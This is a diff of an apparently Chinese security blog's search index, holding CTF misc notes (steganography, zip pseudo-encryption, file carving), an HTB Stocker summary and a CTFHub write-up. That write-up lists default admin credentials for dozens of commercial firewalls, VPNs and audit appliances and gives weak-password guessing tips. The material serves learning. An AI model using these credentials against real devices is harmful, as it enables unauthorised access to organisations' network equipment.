-最有挑战性的地方莫过于安装gaps和对gaps参数的把握，特别是sized的计算,需要先使图片的拼块恰好为像素最大的一条边的正方形，size=该边长像素。另外，pip和python库要提前安装完毕
-</code></pre>
-<h2 id="12-zip伪加密【360压缩无视伪加密】"><a href="#12-zip伪加密【360压缩无视伪加密】" class="headerlink" title="12.zip伪加密【360压缩无视伪加密】"></a>12.zip伪加密【360压缩无视伪加密】</h2><h3 id="1-zip-文件"><a href="#1-zip-文件" class="headerlink" title="1)zip 文件"></a>1)zip 文件</h3><pre><code>一个 ZIP 文件由三个部分组成：
-
-压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志
-</code></pre>
-<h3 id="2-伪加密原理"><a href="#2-伪加密原理" class="headerlink" title="2)伪加密原理"></a>2)伪加密原理</h3><pre><code>zip伪加密是在文件头的加密标志位做修改，进而再打开文件时识被别为加密压缩包。
-
-把 压缩源文件目录区 的 全局方式位标记  的 `01 00` 或 `09 00` 改为 `00 00`  就可以去除密码
-
-把 压缩源文件目录区 的 全局方式位标记  的 `00 00` 改为  `01 00` 或 `09 00`  就可以添加密码 提示
-</code></pre>
-<h3 id="3-压缩源文件数据区"><a href="#3-压缩源文件数据区" class="headerlink" title="3)压缩源文件数据区"></a>3)压缩源文件数据区</h3><pre><code>50 4B 03 04：这是头文件标记（0x04034b50） 
-14 00：解压文件所需 pkware 版本 
-00 00：全局方式位标记（有无加密） 
-08 00：压缩方式 
-5A 7E：最后修改文件时间 
-F7 46：最后修改文件日期 
-16 B5 80 14：CRC-32校验（1480B516） 
-19 00 00 00：压缩后尺寸（25） 
-17 00 00 00：未压缩尺寸（23） 
-07 00：文件名长度 
-00 00：扩展记录长度 
-</code></pre>
-<h3 id="4-压缩源文件目录区："><a href="#4-压缩源文件目录区：" class="headerlink" title="4)压缩源文件目录区："></a>4)压缩源文件目录区：</h3><pre><code>50 4B 01 02：目录中文件文件头标记(0x02014b50) 
-3F 00：压缩使用的 pkware 版本 
-14 00：解压文件所需 pkware 版本 
-00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了） 
-08 00：压缩方式 
-5A 7E：最后修改文件时间 
-F7 46：最后修改文件日期 
-16 B5 80 14：CRC-32校验（1480B516） 
-19 00 00 00：压缩后尺寸（25） 
-17 00 00 00：未压缩尺寸（23） 
-07 00：文件名长度 
-24 00：扩展字段长度 
-00 00：文件注释长度 
-00 00：磁盘开始号 
-00 00：内部文件属性 
-20 00 00 00：外部文件属性 
-00 00 00 00：局部头部偏移量 
-6B65792E7478740A00200000000000010018006558F04A1CC5D001BDEBDD3B1CC5D001BDEBDD3B1CC5D001 
-</code></pre>
-<h3 id="5-压缩源文件目录结束标志："><a href="#5-压缩源文件目录结束标志：" class="headerlink" title="5)压缩源文件目录结束标志："></a>5)压缩源文件目录结束标志：</h3><pre><code>50 4B 05 06：目录结束标记 
-00 00：当前磁盘编号 
-00 00：目录区开始磁盘编号 
-01 00：本磁盘上纪录总数 
-01 00：目录区中纪录总数 
-59 00 00 00：目录区尺寸大小 
-3E 00 00 00：目录区对第一张磁盘的偏移量 
-00 00：ZIP 文件注释长度
-</code></pre>
-<h3 id="6-查找压缩文件目录区"><a href="#6-查找压缩文件目录区" class="headerlink" title="6)查找压缩文件目录区"></a>6)查找压缩文件目录区</h3><pre><code>一般面对一些小的文件时 很容易就找到  压缩文件目录区 的文件头
-
-但是当我们面对一些较大的文件 找 压缩文件目录区的 文件头  50 4B 01 02 就有点麻烦了
-
-我们可以利用 winhex 中的查找 字符查找 快速找到  压缩文件目录区  的文件头
-
-然后把 后面的 全方位标记区 的 01 00 或 09 00  改为 00 00 保存 后就可以打开压缩包了
-</code></pre>
+<p>利用下面贴出的<code>php</code>进行反弹。<br>开启监听</p>
+<p> <img src="/post/Reverses-shell/image-20221020000353533.png" alt="image-20221020000353533"></p>
 ]]></content>
       <categories>
-        <category>网络安全学习</category>
+        <category>daily</category>
       </categories>
       <tags>
-        <tag>crypto&amp;misc</tag>
+        <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>htbのMachines</title>
+    <url>//post/htb(Machines)/</url>
+    <content><![CDATA[<p><code>Machines</code></p>
+<span id="more"></span>
+
+<h1 id="Machines"><a href="#Machines" class="headerlink" title="Machines"></a>Machines</h1><h2 id="【WEB】Stocker-easy"><a href="#【WEB】Stocker-easy" class="headerlink" title="【WEB】Stocker[easy]"></a>【WEB】Stocker[easy]</h2><p><code>个人感觉新东西太多，难度对于开始可能中上</code> </p>
+<p>请先了解学习</p>
+<blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot="">
+<path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path>
+<path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path>
+<path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path>
+<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path>
+<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path>
+<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path>
+<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path>
+</svg>
+</span><p>NoSQL注入</p>
+<p>api利用</p>
+<p>通过iframe利用xss，用伪协议读取文件</p></blockquote>
+]]></content>
+      <categories>
+        <category>Hack the Box</category>
+      </categories>
+      <tags>
+        <tag>htb</tag>
       </tags>
   </entry>
   <entry>
@@ -15051,31 +14887,195 @@ echo $_SESSION[&#39;name&#39;];
       </tags>
   </entry>
   <entry>
-    <title>htbのMachines</title>
-    <url>//post/htb(Machines)/</url>
-    <content><![CDATA[<p><code>Machines</code></p>
+    <title>密码+杂项题简单记录</title>
+    <url>//post/crypto+misc/</url>
+    <content><![CDATA[<p><code>只会web，得分太少，还是搞点密码和杂项来提高一下</code></p>
 <span id="more"></span>
 
-<h1 id="Machines"><a href="#Machines" class="headerlink" title="Machines"></a>Machines</h1><h2 id="【WEB】Stocker-easy"><a href="#【WEB】Stocker-easy" class="headerlink" title="【WEB】Stocker[easy]"></a>【WEB】Stocker[easy]</h2><p><code>个人感觉新东西太多，难度对于开始可能中上</code> </p>
-<p>请先了解学习</p>
-<blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot="">
-<path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path>
-<path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path>
-<path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path>
-<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path>
-<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path>
-<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path>
-<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path>
-</svg>
-</span><p>NoSQL注入</p>
-<p>api利用</p>
-<p>通过iframe利用xss，用伪协议读取文件</p></blockquote>
+<h2 id="1-一般加密"><a href="#1-一般加密" class="headerlink" title="1.一般加密"></a>1.一般加密</h2><pre><code>直接用kali的
+
+ciphey -t &quot;xxx&quot;
+</code></pre>
+<h2 id="2-SSTV图像声音-Audacity波形声音"><a href="#2-SSTV图像声音-Audacity波形声音" class="headerlink" title="2.SSTV图像声音&#x2F;Audacity波形声音"></a>2.SSTV图像声音&#x2F;Audacity波形声音</h2><pre><code>用win10上
+
+MMSSTV工具解析声音，最好用虚拟声卡这样可以屏蔽一些杂音【把声音给MMSSTV听】
+
+Audacity解析声音波形得到波形图像从而得到flag
+</code></pre>
+<h2 id="3-加密压缩包"><a href="#3-加密压缩包" class="headerlink" title="3.加密压缩包"></a>3.加密压缩包</h2><h3 id="1）win10"><a href="#1）win10" class="headerlink" title="*1）win10"></a>*1）win10</h3><p>用<code>win10</code>工具爆破压缩包密码</p>
+<h3 id="2）kali"><a href="#2）kali" class="headerlink" title="2）kali"></a>2）kali</h3><p><code>kali john</code>爆破压缩包</p>
+<pre><code>zip2john 压缩包的名字.zip &gt;&gt; passwdhash.txt
+</code></pre>
+<h2 id="4-图片隐写"><a href="#4-图片隐写" class="headerlink" title="4.图片隐写"></a>4.图片隐写</h2><h3 id="1）win10-1"><a href="#1）win10-1" class="headerlink" title="1）win10"></a>1）win10</h3><p>利用<code>Stegsolve</code>解析图片隐写内容</p>
+<h3 id="2）kali-1"><a href="#2）kali-1" class="headerlink" title="*2）kali"></a>*2）kali</h3><p><code>zsteg</code></p>
+<pre><code>zsteg 图片
+</code></pre>
+<h2 id="5-零宽字符隐写"><a href="#5-零宽字符隐写" class="headerlink" title="5.零宽字符隐写"></a>5.零宽字符隐写</h2><p><a href="http://330k.github.io/misc_tools/unicode_steganography.html">http://330k.github.io/misc_tools/unicode_steganography.html</a></p>
+<p>我们开始看这个内容是没有什么问题的，但是底下的</p>
+<p><code>第7行，第204列</code></p>
+<p>说明里面有其他我们无法看到的字符存在</p>
+<p><img src="/post/crypto+misc/image-20220927160630959.png" alt="image-20220927160630959"></p>
+<p>我们可以利用<code>vim</code>读取一下这个文本文件，就会发现里面多了很多奇奇怪怪的字符</p>
+<p><img src="/post/crypto+misc/image-20220927160526722.png" alt="image-20220927160526722"></p>
+<p>这些就是<code>零宽字符</code></p>
+<p>那么我们如何从中读取信息呢</p>
+<p>这里就需要下面这个网站的，对文本的<code>零宽字符加密</code>和<code>零宽字符解密</code>功能</p>
+<pre><code>http://330k.github.io/misc_tools/unicode_steganography.html
+</code></pre>
+<p>先选好出现的字符类型</p>
+<p><img src="/post/crypto+misc/image-20220927161233239.png" alt="image-20220927161233239"></p>
+<p>然后</p>
+<p><img src="/post/crypto+misc/image-20220927161257809.png" alt="image-20220927161257809"></p>
+<p>得到隐藏内容</p>
+<pre><code>86MygAZ2uJi2oCxctsd28LBNRXHPLykF5LBz8f1xEikWNVpKfpce2CMHvhSJUdk7CHLrEVhGRVQvMwT8r7JUgVWGbnzxb
+</code></pre>
+<p>用<code>ciphey</code> 得到<code>flag</code></p>
+<p><img src="/post/crypto+misc/image-20220927161352763.png" alt="image-20220927161352763"></p>
+<h2 id="6-隐藏秘密-flag-到图片、音乐"><a href="#6-隐藏秘密-flag-到图片、音乐" class="headerlink" title="6.隐藏秘密(flag)到图片、音乐"></a>6.隐藏秘密(flag)到图片、音乐</h2><h3 id="win10"><a href="#win10" class="headerlink" title="win10"></a>win10</h3><p><code>Silenteye</code></p>
+<p><img src="/post/crypto+misc/image-20220927162235740.png" alt="image-20220927162235740"></p>
+<p>把图片或者声音拖入其中</p>
+<p><img src="/post/crypto+misc/image-20220927162311232.png" alt="image-20220927162311232"></p>
+<p>然后执行<code>Decode</code></p>
+<p><img src="/post/crypto+misc/image-20220927162351939.png" alt="image-20220927162351939"></p>
+<p>得到加密信息</p>
+<p>用<code>ciphey</code> 得到<code>flag</code></p>
+<p><img src="/post/crypto+misc/image-20220927162441904.png" alt="image-20220927162441904"></p>
+<h2 id="7-小游戏"><a href="#7-小游戏" class="headerlink" title="7.小游戏"></a>7.小游戏</h2><h3 id="win10-1"><a href="#win10-1" class="headerlink" title="win10"></a>win10</h3><p><code>CE修改器，懂得都懂</code></p>
+<h2 id="8-Java类的"><a href="#8-Java类的" class="headerlink" title="8.Java类的"></a>8.Java类的</h2><p>利用<code>jd-gui</code>对java反汇编，看看有没有信息</p>
+<h2 id="9-二维码"><a href="#9-二维码" class="headerlink" title="9.二维码"></a>9.二维码</h2><h3 id="1）缺少定位点"><a href="#1）缺少定位点" class="headerlink" title="1）缺少定位点"></a>1）缺少定位点</h3><p><img src="/post/crypto+misc/image-20220927163933448.png" alt="image-20220927163933448"></p>
+<p>利用<code>ps</code>把两者拼接起来就可以了</p>
+<h2 id="10-分离图片中的隐藏文件"><a href="#10-分离图片中的隐藏文件" class="headerlink" title="10.分离图片中的隐藏文件"></a>10.分离图片中的隐藏文件</h2><p><a href="https://blog.csdn.net/qq_43531669/article/details/113732757">原文链接</a></p>
+<h3 id="1）图片分析"><a href="#1）图片分析" class="headerlink" title="1）图片分析:"></a>1）图片分析:</h3><p>如图为CTF题目中一个隐藏文件的图片</p>
+<p>首先对图片进行分析，这里介绍一个工具binwalk（kali中是自带的，也可以下载到windows中使用）。</p>
+<p>使用方法：binwalk + 文件路径&#x2F;文件名</p>
+<pre><code>binwalk 1.jpg
+</code></pre>
+<p>执行命令后，binwalk就会自动分析这个jpg文件：</p>
+<p><img src="/post/crypto+misc/image-20220927165710470.png" alt="image-20220927165710470"></p>
+<p>从分析的结果看，这个jpg文件隐藏着一个zip文件，从48221块偏移开始就是zip文件。</p>
+<h3 id="2、如何分离："><a href="#2、如何分离：" class="headerlink" title="2、如何分离："></a>2、如何分离：</h3><p>在得到隐藏信息后，改如何把zip文件分离出，下面介绍几种方法：</p>
+<h4 id="2-1、binwalk-分离："><a href="#2-1、binwalk-分离：" class="headerlink" title="2.1、binwalk 分离："></a>2.1、binwalk 分离：</h4><p>还是使用binwalk工具，使用dd命令分离出隐藏文件：</p>
+<pre><code>dd if=1.jpg of=1.zip skip=48221 bs=1
+</code></pre>
+<p>解释：if 指定输入文件，of 指定输出文件，skip 指定从输入文件开头跳过48221个块后开始复制，</p>
+<p>bs设置每次读写块的大小为1字节</p>
+<p>执行后会得到一个1.zip文件。</p>
+<p><img src="/post/crypto+misc/image-20220927165740304.png" alt="image-20220927165740304"></p>
+<h4 id="2-2、foremost-工具分离："><a href="#2-2、foremost-工具分离：" class="headerlink" title="2.2、foremost 工具分离："></a>2.2、foremost 工具分离：</h4><p>foremost是一个基于文件文件头和尾部信息以及文件的内建数据结构恢复文件的命令行工具，win可以下载使用，Linux可以通过下面命令安装使用：</p>
+<pre><code>apt-get install foremost
+</code></pre>
+<p>Linux下分离文件的命令为：</p>
+<pre><code> foremost 1.jpg
+</code></pre>
+<p>执行命令后，foremost会生成output目录存放分离出的文件。</p>
+<p>Win下是把文件直接拖到 foremost.exe上，也会生成output目录存放分离出的文件。</p>
+<p><img src="/post/crypto+misc/image-20220927165802749.png" alt="image-20220927165802749"></p>
+<h4 id="2-3、hex编辑器分离："><a href="#2-3、hex编辑器分离：" class="headerlink" title="2.3、hex编辑器分离："></a>2.3、hex编辑器分离：</h4><p>hex编辑器有很多，win下有用得较多的winhex、UltraEdit等，linux下有hexeditor等。这里我们以winhex为例来手动分离。</p>
+<p>一个完整的 jpg 文件由 FF D8 开头，FF D9结尾，图片查看器会忽略 FF D9 以后的内容，因此可以在 jpg 文件中加入其他文件。</p>
+<p>经过上面的分析， 知道图片中隐藏了zip文件，zip文件的开头16进制为504B0304，先搜索16进制文本 FFD9，然后后面跟着504B0304，于是就可以从 50 开始，复制到最后（因为这里只有一个zip，所以复制到最后），另存为新文件，就得到了隐藏的压缩包。</p>
+<p><img src="/post/crypto+misc/image-20220927165829838.png" alt="image-20220927165829838"></p>
+<p><img src="/post/crypto+misc/image-20220927165845340.png" alt="image-20220927165845340"></p>
+<p><img src="/post/crypto+misc/image-20220927165911140.png" alt="image-20220927165911140"></p>
+<h4 id="2-4、改后缀名："><a href="#2-4、改后缀名：" class="headerlink" title="2.4、改后缀名："></a>2.4、改后缀名：</h4><p>分析知道隐藏文件是zip后，有一个简单粗暴的方法是直接把图片的后缀改为.zip，然后解压即可（这种方法虽然简单快速，但如果隐写了多个文件时可能会失败）。</p>
+<h2 id="11-多图片拼图"><a href="#11-多图片拼图" class="headerlink" title="11.多图片拼图"></a>11.多图片拼图</h2><p><a href="https://blog.csdn.net/m0_62291930/article/details/124139016">原文链接</a></p>
+<p>Misc 自动拼图<br>需要使用<code>python</code>遗传算法脚本<code>gaps</code>和拼图脚本<code>montage</code></p>
+<p>开始拼图<br>以ctf中的一道训练题puzzle为例</p>
+<p>如果图片为碎片状，根据总数确定拼块长宽数量，并用montage进行第一次拼接</p>
+<p><img src="/post/crypto+misc/image-20220927171241532.png" alt="image-20220927171241532"></p>
+<pre><code>#如左下角所示，总数为256块，即图片以16×16拆分而成的（要在拼块目录下运行命令），
+#*.png为拼块格式，16×16为长宽数量，flag.png为合成后的图片名
+</code></pre>
+<pre><code>montage *.png -tile 16x16 -geometry +0+0 flag.png   
+</code></pre>
+<p>运行后在目录下可找到如下图片</p>
+<p><img src="/post/crypto+misc/image-20220927171709538.png" alt="image-20220927171709538"></p>
+<p>运行后在目录下可找到如下图片</p>
+<p><strong>接着最关键的一点，调整图片长宽比为1：1，可以用PS-&gt;图像大小，以较大数值为边长，扩充为正方形（方便后续size的计算），否则后期gaps无法获得最佳效果</strong></p>
+<p><img src="/post/crypto+misc/image-20220927171907186.png" alt="image-20220927171907186"></p>
+<p><img src="/post/crypto+misc/image-20220927171924733.png" alt="image-20220927171924733"></p>
+<p>接下来就是调用gaps脚本实现自动拼图排序<strong>（重点）</strong></p>
+<p><img src="/post/crypto+misc/image-20220927171940838.png" alt="image-20220927171940838"></p>
+<pre><code>#此处的size为正方形小拼块的边长像素，由于刚刚经过拉伸，拼块从160×100变成了160×160
+#注意是小的正方形像素，比如拼接完成的为360px，而一列有12张图，那size为12px
+gaps --image=flag.png --size=160 --save     
+</code></pre>
+<p><img src="/post/crypto+misc/image-20220927171957840.png" alt="image-20220927171957840"></p>
+<pre><code>补充：gaps各参数的作用
+
+–image 指向拼图的路径
+–size 拼图块的像素尺寸
+–generations 遗传算法的代的数量
+–population 个体数量
+–verbose 每一代训练结束后展示最佳结果
+–save 将拼图还原为图像
+</code></pre>
+<pre><code>总结
+最有挑战性的地方莫过于安装gaps和对gaps参数的把握，特别是sized的计算,需要先使图片的拼块恰好为像素最大的一条边的正方形，size=该边长像素。另外，pip和python库要提前安装完毕
+</code></pre>
+<h2 id="12-zip伪加密【360压缩无视伪加密】"><a href="#12-zip伪加密【360压缩无视伪加密】" class="headerlink" title="12.zip伪加密【360压缩无视伪加密】"></a>12.zip伪加密【360压缩无视伪加密】</h2><h3 id="1-zip-文件"><a href="#1-zip-文件" class="headerlink" title="1)zip 文件"></a>1)zip 文件</h3><pre><code>一个 ZIP 文件由三个部分组成：
+
+压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志
+</code></pre>
+<h3 id="2-伪加密原理"><a href="#2-伪加密原理" class="headerlink" title="2)伪加密原理"></a>2)伪加密原理</h3><pre><code>zip伪加密是在文件头的加密标志位做修改，进而再打开文件时识被别为加密压缩包。
+
+把 压缩源文件目录区 的 全局方式位标记  的 `01 00` 或 `09 00` 改为 `00 00`  就可以去除密码
+
+把 压缩源文件目录区 的 全局方式位标记  的 `00 00` 改为  `01 00` 或 `09 00`  就可以添加密码 提示
+</code></pre>
+<h3 id="3-压缩源文件数据区"><a href="#3-压缩源文件数据区" class="headerlink" title="3)压缩源文件数据区"></a>3)压缩源文件数据区</h3><pre><code>50 4B 03 04：这是头文件标记（0x04034b50） 
+14 00：解压文件所需 pkware 版本 
+00 00：全局方式位标记（有无加密） 
+08 00：压缩方式 
+5A 7E：最后修改文件时间 
+F7 46：最后修改文件日期 
+16 B5 80 14：CRC-32校验（1480B516） 
+19 00 00 00：压缩后尺寸（25） 
+17 00 00 00：未压缩尺寸（23） 
+07 00：文件名长度 
+00 00：扩展记录长度 
+</code></pre>
+<h3 id="4-压缩源文件目录区："><a href="#4-压缩源文件目录区：" class="headerlink" title="4)压缩源文件目录区："></a>4)压缩源文件目录区：</h3><pre><code>50 4B 01 02：目录中文件文件头标记(0x02014b50) 
+3F 00：压缩使用的 pkware 版本 
+14 00：解压文件所需 pkware 版本 
+00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了） 
+08 00：压缩方式 
+5A 7E：最后修改文件时间 
+F7 46：最后修改文件日期 
+16 B5 80 14：CRC-32校验（1480B516） 
+19 00 00 00：压缩后尺寸（25） 
+17 00 00 00：未压缩尺寸（23） 
+07 00：文件名长度 
+24 00：扩展字段长度 
+00 00：文件注释长度 
+00 00：磁盘开始号 
+00 00：内部文件属性 
+20 00 00 00：外部文件属性 
+00 00 00 00：局部头部偏移量 
+6B65792E7478740A00200000000000010018006558F04A1CC5D001BDEBDD3B1CC5D001BDEBDD3B1CC5D001 
+</code></pre>
+<h3 id="5-压缩源文件目录结束标志："><a href="#5-压缩源文件目录结束标志：" class="headerlink" title="5)压缩源文件目录结束标志："></a>5)压缩源文件目录结束标志：</h3><pre><code>50 4B 05 06：目录结束标记 
+00 00：当前磁盘编号 
+00 00：目录区开始磁盘编号 
+01 00：本磁盘上纪录总数 
+01 00：目录区中纪录总数 
+59 00 00 00：目录区尺寸大小 
+3E 00 00 00：目录区对第一张磁盘的偏移量 
+00 00：ZIP 文件注释长度
+</code></pre>
+<h3 id="6-查找压缩文件目录区"><a href="#6-查找压缩文件目录区" class="headerlink" title="6)查找压缩文件目录区"></a>6)查找压缩文件目录区</h3><pre><code>一般面对一些小的文件时 很容易就找到  压缩文件目录区 的文件头
+
+但是当我们面对一些较大的文件 找 压缩文件目录区的 文件头  50 4B 01 02 就有点麻烦了
+
+我们可以利用 winhex 中的查找 字符查找 快速找到  压缩文件目录区  的文件头
+
+然后把 后面的 全方位标记区 的 01 00 或 09 00  改为 00 00 保存 后就可以打开压缩包了
+</code></pre>
 ]]></content>
       <categories>
-        <category>Hack the Box</category>
+        <category>网络安全学习</category>
       </categories>
       <tags>
-        <tag>htb</tag>
+        <tag>crypto&amp;misc</tag>
       </tags>
   </entry>
   <entry>
@@ -18323,6 +18323,513 @@ connection 可选。    规定 MySQL 连接。如果未规定，则使用上一�
 <p><u><code>建议看推荐文章，下面代码审计和题目分析仅是我个人能力结果，只能尽可能说到点处</code></u></p>
 <p><u><code>而且部分也是借鉴推荐文章内容</code></u></p>
 <h1 id="Upload-labs"><a href="#Upload-labs" class="headerlink" title="Upload-labs"></a>Upload-labs</h1><p>建议看文章，最后几关二次渲染和条件竞争建议仔细学习一下</p>
+]]></content>
+      <categories>
+        <category>网络安全学习</category>
+      </categories>
+      <tags>
+        <tag>靶场</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CTFHub-wp</title>
+    <url>//post/wp-CTFHub/</url>
+    <content><![CDATA[<p><code>做做笔记</code></p>
+<span id="more"></span>
+
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="1-密码口令"><a href="#1-密码口令" class="headerlink" title="1.密码口令"></a>1.密码口令</h2><h3 id="1）弱口令"><a href="#1）弱口令" class="headerlink" title="1）弱口令"></a>1）弱口令</h3><p>一般思维，</p>
+<p>用户名：admin，root</p>
+<p>密码：password，admin123，123456</p>
+<p>可以用<strong>top100字典</strong>（可以网上找一下）跑一下，但有的可能需要<strong>枚举法</strong></p>
+<p>比如<strong>admin888</strong>或者<strong>admin255</strong>这样的类似的，就需要在后面用枚举法找出，字典并没包含这种类似情况</p>
+<h3 id="2）默认口令"><a href="#2）默认口令" class="headerlink" title="2）默认口令"></a>2）默认口令</h3><p>就是系统默认的口令，在渗透测试过程中，最常见的情况就是遇到弱口令得到入口从而攻陷整个系统，由于很多系统管理员缺少安全意识，口令往往是系统默认设置的口令</p>
+<pre><code>常见网络安全设备弱口令(默认口令)
+设备    默认账号    默认密码
+深信服产品    sangfor    sangfor sangfor@2018 sangfor@2019
+深信服科技 AD        dlanrecover
+深信服负载均衡 AD 3.6    admin    admin
+深信服WAC ( WNS V2.6)    admin    admin
+深信服VPN    Admin    Admin
+深信服ipsec-VPN (SSL 5.5)    Admin    Admin
+深信服AC6.0    admin    admin
+SANGFOR防火墙    admin    sangfor
+深信服AF(NGAF V2.2)    admin    sangfor
+深信服NGAF下一代应用防火墙(NGAF V4.3)    admin    admin
+深信服AD3.9    admin    admin
+深信服上网行为管理设备数据中心    Admin    密码为空
+SANGFOR_AD_v5.1    admin    admin
+网御漏洞扫描系统    leadsec    leadsec
+天阗入侵检测与管理系统 V7.0    Admin    venus70
+Audit    venus70
+adm    venus70
+天阗入侵检测与管理系统 V6.0    Admin    venus60
+Audit    venus60
+adm    venus60
+网御WAF集中控制中心(V3.0R5.0)    admin    leadsec.waf
+audit    leadsec.waf
+adm    leadsec.waf
+联想网御    administrator    administrator
+网御事件服务器    admin    admin123
+联想网御防火墙PowerV    administrator    administrator
+联想网御入侵检测系统    lenovo    default
+网络卫士入侵检测系统    admin    talent
+网御入侵检测系统V3.2.72.0    adm    leadsec32
+admin    leadsec32
+联想网御入侵检测系统IDS    root    111111
+admin    admin123
+科来网络回溯分析系统    csadmin    colasoft
+中控考勤机web3.0    administrator    123456
+H3C iMC    admin    admin
+H3C SecPath系列    admin    admin
+H3C S5120-SI    test    123
+H3C智能管理中心    admin    admin
+H3C ER3100    admin    adminer3100
+H3C ER3200    admin    adminer3200
+H3C ER3260    admin    adminer3260
+H3C    admin    adminer
+admin    admin
+admin    h3capadmin
+h3c    h3c
+360天擎    admin    admin
+网神防火墙    firewall    firewall
+天融信防火墙NGFW4000    superman    talent
+黑盾防火墙    admin    admin
+rule    abc123
+audit    abc123
+华为防火墙    telnetuser    telnetpwd
+ftpuser    ftppwd
+方正防火墙    admin    admin
+飞塔防火墙    admin    密码为空
+Juniper_SSG__5防火墙    netscreen    netscreen
+中新金盾硬件防火墙    admin    123
+kill防火墙(冠群金辰)    admin    sys123
+天清汉马USG防火墙    admin    venus.fw
+Audit    venus.audit
+useradmin    venus.user
+阿姆瑞特防火墙    admin    manager
+山石网科    hillstone    hillstone
+绿盟安全审计系统    weboper    weboper
+webaudit    webaudit
+conadmin    conadmin
+admin    admin
+shell    shell
+绿盟产品        nsfocus123
+TopAudit日志审计系统    superman    talent
+LogBase日志管理综合审计系统    admin    safetybase
+网神SecFox运维安全管理与审计系统    admin    !1fw@2soc#3vpn
+天融信数据库审计系统    superman    telent
+Hillstone安全审计平台    hillstone    hillstone
+网康日志中心    ns25000    ns25000
+网络安全审计系统（中科新业）    admin    123456
+天玥网络安全审计系统    Admin    cyberaudit
+明御WEB应用防火墙    admin    admin
+admin    adminadmin
+明御攻防实验室平台    root    123456
+明御安全网关    admin    adminadmin
+明御运维审计与册风险控制系统    admin    1q2w3e
+system    1q2w3e4r
+auditor    1q2w3e
+operator    1q2w3e4r
+明御网站卫士    sysmanager    sysmanager888
+亿邮邮件网关    eyouuser    eyou_admin
+eyougw    admin@(eyou)
+admin    +-ccccc
+admin    cyouadmin
+Websense邮件安全网关    administrator    admin
+梭子鱼邮件存储网关    admin    admin
+</code></pre>
+<h2 id="2-信息泄露-备份文件下载"><a href="#2-信息泄露-备份文件下载" class="headerlink" title="2.信息泄露-备份文件下载"></a>2.信息泄露-备份文件下载</h2><p><img src="/post/wp-CTFHub/image-20220919213733369.png" alt="image-20220919213733369"></p>
+<h2 id="2-1-信息泄露-robots-txt"><a href="#2-1-信息泄露-robots-txt" class="headerlink" title="2.1 信息泄露-robots.txt"></a>2.1 信息泄露-robots.txt</h2><pre><code>访问url/robots.txt
+</code></pre>
+<p>查看爬虫协议</p>
